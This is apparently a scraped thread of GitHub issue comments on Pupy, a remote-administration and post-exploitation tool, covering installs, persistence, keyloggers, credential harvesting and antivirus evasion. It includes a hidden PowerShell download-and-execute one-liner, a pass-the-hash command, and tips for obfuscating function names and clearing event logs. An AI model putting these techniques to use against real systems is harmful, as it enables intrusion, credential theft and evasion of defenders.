@Kaizokuou99 You paste the error message you are receiving rather than asking what is wrong. . @kelvin2185 What OS are you using? It seems like the OS repos don't have all the modules that are needed for pupy to run.\nRun the following commands and paste the output:\ngit clone https://github.com/n1nj4sec/pupy.git pupy\ncd pupy\ngit submodule init\ngit submodule update\npip install -r pupy/requirements.txt. It seems you are missing the automake package. Run:\nsudo apt-get install automake\n and then try again.. You need to run the command:\npip install -r pupy/requirements.txt\nagain in order to satisfy all the requirements of python modules. . What is the output of  pip install -r pupy/requirements.txt?. As you can see from the output, you always have some packages missing that is why the modules are not installed. Now you are missing libtoolize which can be installed through\nsudo apt-get install libtool\nI would suggest you look at the errors you are receiving, install the missing components and once the command pip install -r pupy/requirements.txt is successful, only then you would be able to run pupy.. @kelvin2185 Read the wiki https://github.com/n1nj4sec/pupy/wiki. Try:\nrun manage/persistence -e C:\\\\Users\\\\kelvin\\\\Desktop\\\\pupyx86.7x0WQ9.exe -m registry. Are you running pupysh.py as root? 443 is a privileged port and require root privileges to bind. If you have a limited user account, you will have to bind to a port > 1024. Line 2 is telling you make command not found. Make sure make is installed and in the PATH . @n1nj4sec Great to hear from you. And you deserve every bit of your family time since at the end that is what matters the most.\nIn Metasploit, we have this policy that the author of the PR never lands it to the master. We can follow the same procedure here as well. @alxchk and @AlessandroZ are both relatively active here so we can follow the same policy here. They both being the collaborators will lift off a lot of pressure from you. Provided they both agree to the proposal.. I believe this is a copy-pasta. \"show contents of a file\" or anything appropriate. \n. This needs to change to:\n```\nself.module.error('Current process: 32bits, System arch: 64bits, impossible to execute sdclt.exe in this configuration. ABORDING...')\n````. ",
    "badcatjack": "Sorry I'm new.\nThanks for your time tought.\nGood job.\n. ",
    "mandreko": "You should be able to use the pp.py file on OSX endpoints. Additionally, you can bundle it up into a single binary using py2installer and the instructions found here: https://github.com/n1nj4sec/pupy/wiki/Generate-payloads#on-osx\n. Did you attempt it on an osx system? For pyinstaller to create mach-o binaries, you have to do it on OSX. If you run pyinstaller on linux, you'll create elf binaries.\n. Not an asshole. :)\nI just had it fresh in my mind, since I just did the same on Friday.\n. I'd recommend reading through the pp.py file, especially around the \"LAUNCHER\" variable.\n. This is exactly what pyinstaller is for. https://github.com/n1nj4sec/pupy/wiki/Generate-payloads#on-osx\n. Often times when i see this, I also see the error:\n\nOSError: [Errno 24] Too many open files\n. \n",
    "Technoturnovers": "In the meantime, are there any workarounds, like a program that can do some sort of reverse ssh without any configuration? And i say without any configuration because i can't run Nano remotely to configure it.\n. Related, can you add support more more alternative windows shells, like powershell? Powershell doesn't work currently, it doesn't open a prompt.\nExample:\n```\nOpening interactive C:/Windows/System32/WindowsPowerShell/v1.0/powershell.exe ... (encoding : cp437)\nWindows PowerShell \nCopyright (C) 2009 Microsoft Corporation. All rights reserved.\ntest\n```\nAnd when i force cancel by doing Ctrl-C twice, the pupy shell locks up.\n. Turns out this was an error on my part, please delete\n. I need to add tkinter so that i can run GUI python programs, and also because the victim can't have python on it, so i need to be able to load it as a package. This in particular is what i need to run: http://thelivingpearl.com/2013/07/03/simple-gui-text-editor-in-python/\n. Won't load the pyd file\n```\n\n\n\nexecfile('C:/textedit.py')\nPupyPackageLoader: Error while loading package _tkinter (pyd) : MemoryLoadLibrary failed loading _tkinter.pyd\nPupyPackageLoader: Error while loading package Tkinter (py) : MemoryLoadLibrary failed loading _tkinter.pyd, please install the python-tk package\nTraceback (most recent call last):\n  File \"\", line 1, in \n  File \"C:/textedit.py\", line 1, in \n    from Tkinter import *\n  File \"\", line 110, in load_module\nImportError: MemoryLoadLibrary failed loading _tkinter.pyd, please install the python-tk package\n```\n. I did load it though\n. I'll try adding a dll, how do i load it onto the client?\n. I don't understand how that helps me, because the client doesn't have a python install i could copy the DLL to. Can you explain further?\n. I'm confused, I'm supposed to run a python shell on the pupy server's host? I tried that, but I only get this error:\n\n\n\n```\n\n\n\nload_dll('/home/sysop/pupy/pupy/packages/windows/all/tcl85.dll')\nTraceback (most recent call last):\n  File \"\", line 1, in \nNameError: name 'load_dll' is not defined\n```\n\n\n\nAm I misunderstanding what you are saying?\n. not yet, I'm having issues completely unrelated to this\nwhat does that command do?\n. When i try to do import _tkinter, i get this error\n```\n[*] Session 6 opened (10.0.0.253:443 <- 10.0.0.15:60372)\n\n\nrun load_package _tkinter\n[+] package loaded !\npython\nPython 2.7.10 (default, Oct 14 2015, 16:09:02) \n[GCC 5.2.1 20151010] on linux2\nType \"help\", \"copyright\", \"credits\" or \"license\" for more information.\n(InteractiveConsole)\n\npupsrv.clients[0].load_dll(\"/home/sysop/pupy/pupy/packages/windows/all/tk85.dll\")\npupsrv.clients[0].load_dll(\"/home/sysop/pupy/pupy/packages/windows/all/tcl85.dll\")\nrun pyshell\nimport _tkinter\n[*] Session 6 closed\n[-] stream has been closed\nTraceback (most recent call last):\n  File \"pupysh.py\", line 74, in \n    pcmd.cmdloop()\n  File \"/home/sysop/pupy/pupy/pupylib/PupyCmd.py\", line 273, in cmdloop\n    cmd.Cmd.cmdloop(self, intro)\n  File \"/usr/lib/python2.7/cmd.py\", line 142, in cmdloop\n    stop = self.onecmd(line)\n  File \"/usr/lib/python2.7/cmd.py\", line 221, in onecmd\n    return func(arg)\n  File \"/home/sysop/pupy/pupy/pupylib/PupyCmd.py\", line 610, in do_run\n    pj.stop()\n  File \"/home/sysop/pupy/pupy/pupylib/PupyJob.py\", line 116, in stop\n    self.interrupt()\n  File \"/home/sysop/pupy/pupy/pupylib/PupyJob.py\", line 167, in interrupt\n    self.wait()\n  File \"/home/sysop/pupy/pupy/pupylib/PupyJob.py\", line 183, in wait\n    m.client.conn._conn.ping(timeout=2)\nReferenceError: weakly-referenced object no longer exists\n\n\n\n```\n. http://ubuntuforums.org/showthread.php?t=1801747\nWhy would you try to get me to run that?\n. k\n. Can you help me with the error when doing import _tkinter, though?\n. ",
    "AlessandroZ": "For the interactive shell in windows, you could inspire you from the code of this python project: \n- https://github.com/curesec/tools/tree/master/aesshell\nHere is the code of the client: \n- https://github.com/curesec/tools/blob/master/aesshell/bc.py\nIt's not perfect, but it could be an idea. I had some problems with this tool using powershell.\nHope it helps\n. This issue can be closed. It has already been implemented. This issue can be closed. It has already been implemented. You could close this issue now, the keylogger exists for all system now. . This error happens only when the process is launched from a ps1 file (ps1_oneliner or ps1). It crashes when \"ConvertSidToStringSidA\" is called : \n- https://github.com/n1nj4sec/pupy/blob/89aa93532095d49bf3edef6cbf1d7f4edf8ac109/pupy/packages/windows/all/pupwinutils/security.py#L186\nI think, it's the same problem as we have since we work with powershell, it returns an \"ERROR_NOT_ENOUGH_MEMORY\" code error: \n- https://msdn.microsoft.com/en-us/library/windows/desktop/aa376399(v=vs.85).aspx\nIt's weird because when you migrate to another process (you're not on a powershell process anymore), and try to list SID, the process crashes again. \nThis powershell problem needs to be investigated. \n. Hi, \nI have added a commit called \"bug fixes\". Here is the explanation of what I have done: \n- the getppid didn't work on windows (getppid was not recognize as a os module on windows), so I have created a new module getppid (I did the same thing for getpid to have a similar output). \n- I changed the shell_exec module to be able to pass some arguments to our shell command. For example, it was not possible to launch this command: run shell_exec ipconfig /all. \n  Moreover, I added a command to launch an exe on background using run shell_exec -H  because launching an exe without this option will block the communication between the client and the server until the exe has not finished (try: run shell_exec notepad, you will not get the return before the notepad window has not been closed).\n- I changed the entire keylogger to retrieve the layout keyboard (tested on azerty and qwerty). It catch capital letters, numbers, sp\u00e9cial character (\u00e9#{\u00e8, etc). \n. Sorry to open a new issue, I just saw that an existing one was already open (#36). \nI tried using migrate -c  and migrade  and both failed. \nI'm on a Win 8.1 x64 bits.\n. I close this issue to let just the #36 . However, the problem is not closed \n. Ok, no problem, I removed the changes about the session options. I didn't this feature to interact with many sessions. \nI wanted to create a check because lots of times on my tests, I tried to interact with a session that did not exist. For example, when you migrate on another process, you see another session created and the main one closed. However, you decrease the id of the migrated process to stay on the same session which is a good thing but when you don't know this behaviour you want to interact with the new session created with its id even if it is not exist. So you have no warning saying that no session exists until you launch your first command. \nIt's not a problem to keep it like that. \nAnyway, great job for your project. I will try to add more feature when I will have more time. \nAlessandro\n. You were right, I didn't think about writing on stdin, it works well. Now, the powershell script is not written to the disk even it's a big file. \nIt does not compress anymore the file, but the script is sent encoded in base64, and retrieve in base64 as well to avoid problems (without this I had lot of problems and the output was empty). \nHave a nice day.\nAlessandro\n. The new commit should fix the keylogger issue (#135). \n. shell_exec: tested on linux and windows. Now you can: \n- run shell_exec \"ps aux\" \n- run shell_exec -s /bin/sh \"ps aux\"\n  getpid, getppid and ps modules work. \n. Last commit before my holidays. \nLazagne is launched on memory. All modules are loaded as packages. It only works for Windows x86 processes (for x64 bits, it's possible to migrate to a 32 bits process before launching it). \nI have no time to do the same for x64 bits but I will do it later (I only have to put the good pyd and dll, lazagne modules will not change). \nFor Linux, it will be harder because I saw that the tool does not manage \".so\" files so it could take more time to me implemented. \nHave a nice day. \nAlessandro\n. I  have made some changes on Lazagne. You should not get the error message again. No more files are written on the disk (for more information: https://github.com/AlessandroZ/LaZagne/blob/master/CHANGELOG). \nHowever, I changed as well the arborescence of the files (it should not change anymore, at least for windows), so you should changed the symbolic link too. See you !\n. I forgot to say that I have changed the impacket folder to \"packages/all/impacket\". The goal was to use this lib for linux and windows client. I didn't have push this change to this commit, so you could have an error trying it. Don't forget to change this folder to the correct place. Thks. \n. I have changed the module and renamed it. It works well. \nThe session is well established. I don't know why, it freezes few seconds the server once the session is established f and get back to normal after. \nSo now it's possible to upload a file and execute it on the remote server (not where we have a session but when we try the pass the hash). \nrun smbexec -u Administrateur -H aa...:aada <ip> -F <path>\nIt could be useful for pivoting. \nFeel free to rename this module as you want, I didn't have many idea. I renamed it smbexec but it could launch wmi command as well. \n. I've added a new module (nothing very new). It lists shared folders on a local and remote host. On a local host, it uses wmi to do that (that's why I commited on the same branch). and for remote host, it does an smb connection and it enumerates shared folders privileges as well\nAt first I 've added this feature to \"smbmap\" module but I wanted to split it into 2 different modules. \n. I have also obfuscated by a random name all well known function \"Invoke-BypassUAC\" and \"Invoke-Pe...\" to not be triggered by AVs.\n. I have changed the dictionary used to store passwords, it was more easy to retrieve values on the json. So please, update the lazagne submodule to my last commit. \nThanks. \n. Now lazagne works for linux host. The shared library are well loaded on the remote host. \nPlease add these lib to linux package directory:\n- Python file\npackages/linux/all/dbus/\npackages/linux/all/etree/\npackages/linux/all/lazagne/\n- Shared library\ncrypt.so\n_dbus_bindings.so\n_elementtree.so\npyexpat.so\n_sqlite3.so\nHere is what my directory looks like\npupy/pupy/packages/linux/all$ tree -L 1\n.\n\u251c\u2500\u2500 crypt.so\n\u251c\u2500\u2500 dbus\n\u251c\u2500\u2500 _dbus_bindings.so\n\u251c\u2500\u2500 _elementtree.so\n\u251c\u2500\u2500 etree\n\u251c\u2500\u2500 keylogger.py\n\u251c\u2500\u2500 lazagne\n\u251c\u2500\u2500 linux_stealth.py\n\u251c\u2500\u2500 persistence.py\n\u251c\u2500\u2500 ptyshell.py\n\u251c\u2500\u2500 pupystealth\n\u251c\u2500\u2500 pyexpat.so\n\u2514\u2500\u2500 _sqlite3.so\nNote: This technic works great on using binary payload, however, using a classic python file, it fails. I don't know how the python file is generated but the client code seems different. Here is the error:\n========= Remote Traceback (1) =========\nTraceback (most recent call last):\n  File \"<memimport>/rpyc/core/protocol.py\", line 305, in _dispatch_request\n  File \"<memimport>/rpyc/core/protocol.py\", line 535, in _handle_call\n  File \"<string>\", line 118, in load_module\nNameError: name '_memimporter' is not defined\nNote 2: The binary payload works only on my host (my VMs libc versions are older so it does not work), so I didn't test on many hosts. I have done my test only on a x64 machine. \n. etree is for xml. This is weird because, the main directory is xml. If I put etree and not xml, I suppose I had my reason lol.\nAnyway, it's on the xml repo and it I use it on lazagne like that: \nimport xml.etree.cElementTree as ET\nAnd here is where it is located on the disk\n# /usr/lib/python2.7/xml/etree/ElementTree.pyc matches /usr/lib/python2.7/xml/etree/ElementTree.py\n. This lib is used many times on lazagne to parse xml: https://github.com/AlessandroZ/LaZagne/search?utf8=%E2%9C%93&q=+xml.etree.cElementTree+\nHowever, you may have right saying that is not the directory \"xml\" which is used, maybe it is the lib installed on my OS. However, it's weird because, doing tests, everytime, I had module errors, and I had to use load_package manually on the code to correct the problem. That's why I explicitly say which import to load. \nTry without adding the xml lib, maybe no errors will be prompted, but I don't know how it could find the cElementTree lib. \n. You're right, the file has already been merged. I have added the symbolic link for linux. \nBefore to close the pull request, I have tried lazagne on linux using your (@alxchk) x64 linux binary and I had an error loading the sqlite3 dependency. Here is the stacktrace: \nFile \"<string>\", line 116, in load_module\n  File \"<string>\", line 97, in load_module\n  File \"<memimport>/sqlite3/dbapi2.py\", line 28, in <module>\n  File \"<string>\", line 130, in load_module\n  File \"<string>\", line 97, in load_module\n  File \"<memimport>/sqlite3/__init__.py\", line 24, in <module>\n  File \"<string>\", line 130, in load_module\n  File \"<string>\", line 97, in load_module\n  File \"<memimport>/lazagne/softwares/browsers/mozilla.py\", line 9, in <module>\n  File \"<string>\", line 130, in load_module\n  File \"<string>\", line 97, in load_module\n  File \"<memimport>/lazagne/config/manageModules.py\", line 6, in <module>\n  File \"<string>\", line 130, in load_module\n[-] tuple index out of range\nI don't think the error comes from the lazagne code because it works well on my host. \nHere is my host configuration: \nDistributor ID: Ubuntu\nDescription:    Ubuntu 15.10\nRelease:    15.10\nCodename:   wily\nThanks for your help. \n. Ok, my fault. \nCloning the project works great. I don't know what happened, because my project was sync with the master of pupy. Anyway, I tried and everything is ok. \n@n1nj4sec, i let you close the pull request if it's ok for you. \n@alxchk, I don't know if it's easy to do (I didn't check the client code) but I noticed that launching the linux binary, the current path is always on the root directory (\"/\"). I needed to get the current directory for the sudo_alias module (https://github.com/n1nj4sec/pupy/blob/master/pupy/packages/linux/all/sudo_alias.py#L126)  so I noticed that. If you think, it's easy to do, it will be great to do it. \nThanks both for your work, pupy is becoming really cool !\n. Why have you closed your pull request ? There were some good stuff in it. \n. I understand, nice work by the way :)\n. I have noticed, when you run \"search\" or another module and you stop it right now (CTRL+C), the daemon process is still running in background And don't lose the shell, but the process is running one the remote host. It's good to know, to try to fix one day. \n. Last commit to let you time to merge everything :)\nHowever, I had developed this script during an audit for post exploitation. It's an ssh client for linux and windows. It is also useful when you find a private key and the known_hosts file. You can extract ip from this file and check if the private key allow you to connect to one host. It does not work if the private key is encrypted, but it's not blocking. An authentication using a password is allowed too. \nYou need to add the paramiko and the ecdsa lib. \ncp -R /usr/local/lib/python2.7/dist-packages/paramiko/ packages/all/\ncp -R /usr/local/lib/python2.7/dist-packages/ecdsa/ packages/all/\nI used the same lib for windows and linux. I have tested it on these two OS. \nHave a nice day. \n. Ahaha, yes I know that clearing event logs lets an explicit message. However, when you do a path the hash on the machine, you have multiple event logs created so at least you can choose which kind of event you want to let. \nThe difference with linux logs is when you clear the event logs, you wait 5 min and you could see so many logs created on windows that you can clear it and it's not as visible as it could be on a Linux host. \n. Sorry ;)\n. I forgot to say that the \"memorpy\" submodule should be upgrading to the new version of your github. Otherwise, the \"groups\" variable will not be found. . Ahaha yeah it's a weird error. \nHowever, it only occurred trying to impersonate a lot of different SIDs (> 10-15) on a server. . The keylogger is not the best one (do not manage multiple layout), however, it works. It has been taken from metasploit because it's quite easy and do not require external lib to embed instead of all python project that I have found. . All functions have been tested on the OS X VM - El Capitain. I have done some tests using mss. So it works great on a Linux host however I had some issue on Mac OS (I didn't try on a Windows host).\nThe problem is from the following line which returns a non valid dictionary. \nmonitors = screenshoter.enum_display_monitors()\nFor example, my monitor size was equal to: \n{'width': 179769313486231570814527423731704356798070567525844996598917476803157260780028538760589558632766878171540458953514382464234321326889464182768467546703537516986049910576551282076245490090389328944075868508455133942304583236903222948165808559332123348274797826204144723168738177180919299881250404026184124858368L, 'top': -89884656743115785407263711865852178399035283762922498299458738401578630390014269380294779316383439085770229476757191232117160663444732091384233773351768758493024955288275641038122745045194664472037934254227566971152291618451611474082904279666061674137398913102072361584369088590459649940625202013092062429184L, 'height': 179769313486231570814527423731704356798070567525844996598917476803157260780028538760589558632766878171540458953514382464234321326889464182768467546703537516986049910576551282076245490090389328944075868508455133942304583236903222948165808559332123348274797826204144723168738177180919299881250404026184124858368L, 'left': -89884656743115785407263711865852178399035283762922498299458738401578630390014269380294779316383439085770229476757191232117160663444732091384233773351768758493024955288275641038122745045194664472037934254227566971152291618451611474082904279666061674137398913102072361584369088590459649940625202013092062429184L}\nIf I hard coded the dictionary using correct value, it worked well:\nmonitors = [{'width': 1600, 'top': 0, 'height': 900, 'left': 0}]\nThis lib looks good and very interesting. I will take a look if I will found the error. I think, it could be a solution to hard code value even it's not the best way to do it.\nNote: I also had to add the PupyConfig file that you have in your git repository which is not present on the main pupy project. \n. I have managed to use mss without errors and I'm quite surprised how well it works. I was wrong about the problem.\nThat was my error: \n[-] range() result has too many items\nHowever, I have noticed that the first cell of the monitor dictionary was wrong or was a duplicate value of the second cell. So doing so: https://github.com/n1nj4sec/pupy/pull/303/commits/ef29c7e25f03f717a6193ed27b45ad4b1ffb58f4#diff-0261e5563061d2e8b8bb4e2c8ff586bcR50 fixed the issue\nI have tested it with one or multiple monitors on linux and mac os and it works very well. It should works on Windows without problem. With multiple monitors, multiple png files are created. I put these lines on comment because I did not use the pupyconfig file: https://github.com/n1nj4sec/pupy/pull/303/commits/a91a0e99373681b97a69524607e0341c90a0ce6d#diff-805b051f3432acd4412dafbea399eee2R85 . @alxchk, when I see how many commits you have done on your fork project, I'm quite impressed. It could be great to add it to the main project ;). @alxchk no problem, thanks ! . In your title example, there is not space between \"run\" and \"lazagne\". So the module \"runlazagne\" is not present and it's normal. \nType \"run\" and use the auto completion to write lazagne to be sure of the spelling. . Ahaha, I will continue in English to be understood by all. \nHowever, your problem is that you use an old version of lazagne. Now, lazagne use the runlazagne funciton (https://github.com/AlessandroZ/LaZagne/blob/master/Windows/laZagne.py#L217) that you should not have it on your pupy version. So Try, to upgrade the lazagne submodule or try to clone another time the pupy directory, it should fix your problem. \n. The first explicit error that I had, was that the module \"unicodedata\" was missing on my linux host. It used when the OpenSSL import is done (visible in pupylib/PupyPackagesDependencies.py). \nI comment this line, but it should produce the import problem. . This error should be fixed, I have done a new commit on the project. \nI have tested it again and I have some imports problem at first that I didn't have using previous pupy version but the module is well loaded and it works. Executing the second time no module errors are loaded. \n```\n\n\nrun changeme -c web --name tomcat --target 192.168.0.10\n.... (some imports errors)\nImportError: cannot import name MozillaCookieJar\n[-] Error loading package asn1crypto._perf._big_num_ctypes (asn1crypto/_perf/_big_num_ctypes.pyo pkg=False) : Traceback (most recent call last):\n  File \"\", line 281, in load_module\n  File \"C:\\users\\me\\temp\\pip-build-0shywm\\asn1crypto\\asn1crypto_perf_big_num_ctypes.py\", line 33, in \nLibraryNotFoundError: The library libcrypto could not be found\nWARNING:root:Path contains unsafe binary objects: _speedups.so\n[-] Error loading package requests.packages.urllib3.contrib.socks (requests/packages/urllib3/contrib/socks.pyo pkg=False) : Traceback (most recent call last):\n  File \"\", line 281, in load_module\n  File \"/home/joe/.local/lib/python2.7/site-packages/requests/packages/urllib3/contrib/socks.py\", line 27, in \nImportError: No module named socks\nLoaded 1 default credential profiles\nLoaded 17 default credentials\n\n\n[!] passwords not found\n\n\nrun changeme -c web --name tomcat --target 127.0.0.1\nLoaded 1 default credential profiles\nLoaded 17 default credentials\n\n\n[+] Apache Tomcat\n[+] URL: http://127.0.0.1:8080/manager/html\n[+] tomcat/tomcat\n[+] Apache Tomcat\n[+] URL: http://127.0.0.1:8080/manager/html\n[+] ovwebusr/OvW*busr1\n[+] Passwords stored on the database\n```\nI would prefer to work using the real \"changeme\" project from ztgrace but I had rebuilt everything to be used with pupy, and my pull request had not been accepted. Moreover, lots of external lib have been added such as shodan that would not be very interesting to add on pupy. \nIf one day, he does everything to be compatible with pupy, we will change the submodule location to his repository without problem. . @dc3l1ne, I forgot to do it when System, it's done now. Thanks ! . I have done my test using Win 8.1 but it should work on a Win7 or Win10. You should be admin (UAC bypassed or System) to be able to use WMI persistence. If you have a success message, it means that the WMI event has been successfully created. To check it manually, you should see some information putting this line on powershell console: \nGet-WmiObject __eventFilter -namespace root\\\\subscription -filter \"name='Updater'\"\nThis check is done automatically here\nIf this check works, it means that the problem is your payload and not the WMI creation. If not, I should do some test on Win10 system. \nI have done my tests using a ps1_oneliner payload. \nSo, you should have : \n- a pupygen listening and waiting the connection back, \n- add your powershell line respecting the backslash as it's written on the example\n(or I have tried adding an exe path and it worked).\nThen reboot, and wait 4 minutes (the time can be fixed here.\n. I forgot, however \"python-xlrd\" is needed to run \"Windows-Exploit-Suggester.py\". I don't change the requirements.txt to not modify a file already changed on another commit but it should be added later. . Once, I detected a vulnerable system to the dirty cow exploit using the linux version. I got a root shell thanks to it. I agree it's quite difficult to find a useful exploit for windows but for Linux it's not as bad as you said. \nI let the pull request open and if it's not wanted, it doesn't matter if it's not merged ;)\n. I have tried again and I don't have the issue anymore. I don't know how it has been corrected or why I had this error message, but I had an import error during a security assessment a month ago. \nI close this pull request, it seems ok right now. . Ok that's why ! \nThank for your answer, I don't follow the unstable branch so I don't see what is merged or not. . In ./pupygen.py -f py_oneliner -h you have --ps1-oneliner-listen-port which has been done to listen the http server on another port. I think it would be a good idea, to rename it to --oneliner-listen-port and using this value for ps1 and py onliners. \nLike that, you could listen on different port that you reverse shell use (like you did on your pull request).. To avoid errors, I replaced not printable char by \"?\"\nHowever, it has changed now. I also had some printing errors. With the last version of basic_cmd I have this error doing an ls: \n[-] 'ascii' codec can't encode character u'\\xe9' in position 6: ordinal not in range(128)\nAnd when I use your last basic_cmd @alxchk, I have this issue (which is the same with the stacktrace in addition): \n```\n[-] 'ascii' codec can't encode character u'\\xe9' in position 2006: ordinal not in range(128)\n========= Remote Traceback (1) =========\nTraceback (most recent call last):\n  File \"C:\\Python27\\Lib\\site-packages\\rpyc\\core\\protocol.py\", line 305, in _dispatch_request\n    res = self._HANDLERShandler\n  File \"C:\\Python27\\Lib\\site-packages\\rpyc\\core\\protocol.py\", line 535, in _handle_call\n    return self._local_objectsoid\n  File \"\", line 208, in exposed_json_dumps\nUnicodeEncodeError: 'ascii' codec can't encode character u'\\xe9' in position 2006: ordinal not in range(128)\n```\n. It's easy to fix my issue changing the the \"ls\" module (removing the unicode prefix and adding the \".encode('utf-8', errors='ignore')\" as following: \ndef output_format(file):\n    out = '  {}{}{}{}{}{}{}'.format(\n        '{:<10}'.format(file_timestamp(file['ts'])),\n        '{:<3}'.format(file['type']),\n        '{:<5}'.format(file['uid']),\n        '{:<5}'.format(file['gid']),\n        ' {:06o} '.format(file['mode']),\n        '{:<11}'.format(size_human_readable(file['size'])),\n        '{:<40}'.format(file['name'].encode('utf-8', errors='ignore')))\nHowever, doing like that unicode will be never managed. So I won't do a pull request before to decide if we stay in ascii or we use unicode (and find a solution for encoding issue). . I have an encrypted file here \"pupy/crypto/credentials.py\"\nfile pupy/crypto/credentials.py \npupy/crypto/credentials.py: data\nBut I don't have a pupy directory on my \".config\" directory (I have checked on my regular user and on the root directory). It could be the problem. \nTo understand a little bit, when you talked about credentials, which ones are stored on the credentials.py file. Is it users credentials from \"data/db/creds.json\" or credentials used by pupy ? \n. No, same issue without sudo or launching everything with the root user. I still not managed to get a working reverse shell. \nI don't know how to build a debug template so I get this error (output from pupygen.py and --debug option): \nValueError: Template not found (/tmp/pupy/pupy/payload_templates/pupyx64d.lin)\nI don't know if it's because of Gnome keyring but lots of times (not always), pupysh is quite long to start (almost as long as metasploit lol). . I don't know if using a system wallet it's a good idea, because it depends to much on the system (someone on KDE could not manage to use it). \nEven if these files are sensitive, I don't know if it's necessary to encrypt it. I think it's an heavy process which could be quite painful. \nMaybe we could add an option on a configuration file to use it or not. \n. Ok so, I have removed the credentials.py file to use a non encrypted file, I launched pupysh with the -NE option and it has created a new credentials.py file not encrypted. \nCreating a python payload as you told me works well. However, I have tried to generate windows and Linux payloads and no one worked. \nMaybe it could be a problem on the templates. \nI will try to investigate when I will have more time. \n. Ok ok, my fault !!!\nI have mixed older payloads and the new ones. Trying to resolve the Gnome keyring problem, I have tried to use different templates and when this problem has been fixed I didn't replace the good template with the last one. Sorry, now it works. I have tried windows and linux binaries and it works. \nThanks for your time, at least I understood the goal of Gnome keyring on pupy :) \nI close the issue. \n. I think, it could be better to add the gnome keyring functionality as false by default and not True or adding some explaination on the Wiki. \nOtherwise, I think many people will have the same issue as me and won't be able to understand the problem. . I have noticed a problem on the ps1 oneliner too. It's not a problem of certificat, it's because, two commands are prompt (one using base64 encoding, and one in clear text). The one in cleartext does not work because  quotes are missing after the \"-c\" option. The encoding string work by the way. \nAnd another problem, it's not possible to use another protocol than ssl (no ssl options are provided here) and it's set to True by default here. \nSo we should change it a little bit. . Launching the command line from a powershell console I got this error: \n```\nPS C:\\Windows\\System32\\WindowsPowerShell\\v1.0> powershell.exe -w hidden -noni -n\nop -c [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$\ntrue};iex(New-Object System.Net.WebClient).DownloadString('https://192.168.0.15:\n8080/eiloShaegae1')\npowershell.exe : ScriptBlock ne doit \u00eatre sp\u00e9cifi\u00e9 qu'en tant que valeur du\nparam\u00e8tre Command.\nAu caract\u00e8re Ligne:1 : 1\n+ powershell.exe -w hidden -noni -nop -c\n[System.Net.ServicePointManager]::ServerC ...\n+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n~~~\n    + CategoryInfo          : InvalidArgument : (:) [], ParameterBindingExcept\n   ion\n    + FullyQualifiedErrorId : IncorrectValueForCommandParameter\nException lors de l'appel de \u00abDownloadString\u00bb avec \u00ab1\u00bb argument(s): \u00abLa\nconnexion sous-jacente a \u00e9t\u00e9 ferm\u00e9e: Impossible d'\u00e9tablir une relation de\nconfiance pour le canal s\u00e9curis\u00e9 SSL/TLS.\u00bb\nAu caract\u00e8re Ligne:1 : 120\n+ powershell.exe -w hidden -noni -nop -c\n[System.Net.ServicePointManager]::ServerC ...\n+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n~~~\n    + CategoryInfo          : NotSpecified: (:) [], MethodInvocationException\n    + FullyQualifiedErrorId : WebException\nPS C:\\Windows\\System32\\WindowsPowerShell\\v1.0>\n```\nAdding double quotes between the arg of the -c option solve this problem. \nHowever, it worked from a cmd console.. It seems to be very complicated to add this feature without creating a GUI (a web application or a thick client) but interactive modules should not work as well on an interface as it works now on a terminal. \nThe only interactive shell I have seen in a web application is the shell used by cozy cloud which is great, you feel to be in a real terminal: https://github.com/alpha14/cozy-term\nBut integrating pupy in a web application it's a lot of work and that's not my priority at this moment. I just wanted to share the interactive shell project. \n. I have just tried again this feature and I didn't have any problem. Check your registry key (HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run), if the key after reboot is still present. If it's not, your antivirus removed it. \nSo that's another problem. . I think it should be a good idea to use profiles (or managing these profiles on the pupy.conf file) as cobalt strike has: check this example. It should be easier to configure. . Moreover, some AV detects really well migrations, it should be done manually to control what is happening.  . Hi @Strazzom, sorry for my late answer. \nSharing the same session won't reduce the network traffic. However, Cobalt strike allows the user to change the hearbeat rate of the client when you don't use your client at all. I think, this could be a good idea to implement it. It's like \"hibernating\" all sessions not used. \nHowever, I think sharing the same session is a wonderful idea for pivoting into a network. Right now, pivoting can be done using port forwarding but it's not as easy as it could be. A port should be openned on the remote host. Cobalt strike use named pipe to communicate between sessions which does not require any new open port listening. I don't know right now how hard it could be to implement it, but the idea is cool. I knew that all actions like bypassing uac or becoming system was not possible using a tcp bind payload, it has been implemented now but a new port is open and I think it's not the best way. \nMoreover, AV complicates a little bit the way to use these modules. To elevate our privilege, a dll or an exe should be written and executed on the remote host. Some AV will scan all new exe launched on the disk which means if you execute these modules, you will be scanned again (which could be weird for a user), sometimes migrating to a process could be triggered too (which is used by default on these modules). That's why, I have added the possibility to restart the same process if we use an exe as payload, or a powershell version (which that bypass most AV). \nI don't know how Cobalt strike deploys new sessions without beeing trigger by AV. We should add some way to allow a user to use its own packer or way to generate custom exe / or to encrypt dlls. It could simplify some modules like getsystem and bypass uac because custome exe or dlls could be written on the disk without being trigger by AV (like Cobalt Strike?).. - The 'uid' field has been added again to be able to sort creds found by host (creds --sort). I agree that if the mimikatz binary could be injected in memory, the powershell version is not necessary. I liked the powershell version because you can retrieve password from a 32 bit process on a 64 bit host (it launches a 64 bit powershell instance). I think it could be done using the memoryexec module using the \"suspended_proces\" option but I still have some problem of compatibility here. \n. This ugly fixe simulates the enter key pressed once the execution is done. \nI think it's important to do it (using this technic or another one), because if you launch mimikatz on many hosts, it could be very painful to press \"enter\" many times. \nHowever, this technic requires to install PyUserInput and Xlib: \nsudo apt-get install  python-xlib . @alxchk, I have commented your code to insert into the database because it stores duplicated values. I tried to debug your code but I cannot found a way. If you find a way, remove my code :). @alxchk, I have tried the memstrings module without success. I don't know if I miss something or if there is something to fix. I tried:\nrun memstrings -p <pid> -S\nI have no return output and debugging the module, it seems to never enter on the for loop. So maybe, the pattern does not work for all processes. I have tried it on Windows and Linux. Do I miss something ? Thanks for your help. . Awesome, thanks you !! :). Note that on the tag [on_connect] in the configuration file, the action should have a different name, otherwise only one action is performed. \nIt has to be like that: \n[on_connect]\nrun_module1 = lazagne\nrun_module2 = gather/keylogger start. When the pull request 506 will be merged, you should not see the error message anymore. . Do not accept this PR, I still have an issue with it that I cannot understand. \nUsing my PR, mscache are well stored on the DB. However, even if no creds are stored, my pupy server asks for the credential passwords all the time and I loose the control of the shell (I have to restart a new one).  When I use gnome to store my credential, 